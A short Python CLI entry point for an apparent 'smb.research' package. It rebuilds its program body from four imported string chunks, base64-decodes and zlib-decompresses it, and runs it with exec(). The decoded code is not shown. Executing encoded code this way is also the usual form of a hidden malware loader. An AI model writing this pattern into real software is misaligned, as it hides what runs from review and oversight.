"""CLI: python -m smb.research <command> — body zlib-transported."""
from __future__ import annotations
import base64, zlib
_CHUNKS = []
from smb.research._main_chunk_0 import CHUNK as _C0
_CHUNKS.append(_C0)
from smb.research._main_chunk_1 import CHUNK as _C1
_CHUNKS.append(_C1)
from smb.research._main_chunk_2 import CHUNK as _C2
_CHUNKS.append(_C2)
from smb.research._main_chunk_3 import CHUNK as _C3
_CHUNKS.append(_C3)
exec(zlib.decompress(base64.b64decode("".join(_CHUNKS))).decode("utf-8"), globals())
